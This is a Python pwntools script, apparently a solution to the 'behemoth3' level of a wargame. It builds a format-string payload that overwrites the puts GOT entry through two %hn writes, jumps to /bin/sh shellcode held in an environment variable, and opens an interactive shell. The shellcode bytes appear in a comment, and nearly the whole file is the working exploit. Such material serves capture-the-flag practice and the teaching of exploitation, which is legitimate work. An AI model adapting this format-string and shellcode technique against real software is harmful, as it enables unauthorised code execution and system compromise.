from pwn import *

puts_got = 0x80497ac

address1 = p32(puts_got)
address2 = p32(puts_got + 2)

inp = raw_input("Shellcode lower word: ")
num = int(inp,16)

# shellcode in env variable 
# sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
# sc at 0xffffde8e
# de8e -> 56974 -> 56974 - 8 = 56966
# ffff -> 65535 -> 65535 - 56974 = 8561
payload = address1
payload += address2
payload += '%'+str(num-8)+'x'
payload += '%1$hn'
payload += '%'+str(65535-num)+'x'
payload += '%2$hn'

print payload

#r = process(["/tmp/pwoer3/behemoth3"], shell=True)
r = process(["/behemoth/behemoth3"], shell=True)
r.sendline(payload)
print r.recvline()
r.interactive()
